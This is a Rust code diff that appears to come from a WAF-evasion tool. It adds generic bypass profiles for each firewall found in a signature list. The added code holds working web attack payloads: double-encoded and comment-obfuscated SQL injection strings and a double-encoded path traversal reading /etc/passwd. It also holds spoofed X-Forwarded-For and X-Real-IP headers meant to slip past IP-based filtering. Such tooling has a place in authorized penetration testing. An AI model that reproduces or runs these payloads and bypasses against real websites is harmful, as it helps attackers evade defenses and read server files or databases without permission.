@@ -1,5 +1,7 @@
 use crate::waf::bypass::BypassTechnique;
+use crate::waf::data::get_waf_signatures;
 use serde::{Deserialize, Serialize};
+use std::collections::HashSet;
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct WafProfile {
@@ -17,7 +19,7 @@ pub struct ProfileBypass {
 }
 
 pub fn get_waf_profiles() -> Vec<WafProfile> {
-    vec![
+    let mut profiles = vec![
         get_cloudflare_profile(),
         get_akamai_profile(),
         get_aws_waf_profile(),
@@ -26,7 +28,10 @@ pub fn get_waf_profiles() -> Vec<WafProfile> {
         get_f5_asm_profile(),
         get_cloudfront_profile(),
         get_sucuri_profile(),
-    ]
+    ];
+
+    profiles.extend(get_generated_profiles(&profiles));
+    profiles
 }
 
 pub fn get_profile_by_name(name: &str) -> Option<WafProfile> {
@@ -412,6 +417,73 @@ pub fn get_auto_profile() -> WafProfile {
                 headers: vec![],
                 payloads: vec!["1\u{200b}OR\u{200b}1=1".to_string()],
                 description: "Zero-width injection".to_string(),
+            },
+        ],
+    }
+}
+
+fn get_generated_profiles(existing_profiles: &[WafProfile]) -> Vec<WafProfile> {
+    let existing_names: HashSet<String> = existing_profiles
+        .iter()
+        .map(|p| p.name.to_lowercase())
+        .collect();
+
+    let mut generated = Vec::new();
+    for signature in get_waf_signatures().values() {
+        let waf_name = signature.name.trim();
+        if waf_name.is_empty() || existing_names.contains(&waf_name.to_lowercase()) {
+            continue;
+        }
+        generated.push(build_generic_profile_for_waf(waf_name, &signature.headers));
+    }
+
+    generated
+}
+
+fn build_generic_profile_for_waf(name: &str, headers: &[String]) -> WafProfile {
+    let mut header_bypass_set = vec![
+        ("X-Forwarded-For".to_string(), "127.0.0.1".to_string()),
+        ("X-Real-IP".to_string(), "127.0.0.1".to_string()),
+        ("X-Originating-IP".to_string(), "127.0.0.1".to_string()),
+    ];
+
+    if let Some(marker) = headers.first() {
+        header_bypass_set.push(("X-WAF-Marker".to_string(), marker.clone()));
+    }
+
+    WafProfile {
+        name: name.to_string(),
+        detection_signatures: headers.iter().take(4).cloned().collect(),
+        bypasses: vec![
+            ProfileBypass {
+                technique: BypassTechnique::HeaderManipulation,
+                headers: header_bypass_set,
+                payloads: vec![],
+                description: format!("Generic {} header bypass set", name),
+            },
+            ProfileBypass {
+                technique: BypassTechnique::UserAgentRotation,
+                headers: vec![(
+                    "User-Agent".to_string(),
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
+                )],
+                payloads: vec![],
+                description: format!("Generic {} browser user-agent", name),
+            },
+            ProfileBypass {
+                technique: BypassTechnique::DoubleEncoding,
+                headers: vec![],
+                payloads: vec![
+                    "%2527%2520OR%25201%253D1--".to_string(),
+                    "%252e%252e%252fetc%252fpasswd".to_string(),
+                ],
+                description: format!("Generic {} double encoding payloads", name),
+            },
+            ProfileBypass {
+                technique: BypassTechnique::CommentObfuscation,
+                headers: vec![],
+                payloads: vec!["1'/**/OR/**/1=1--".to_string()],
+                description: format!("Generic {} comment obfuscation payload", name),
             },
         ],
     }
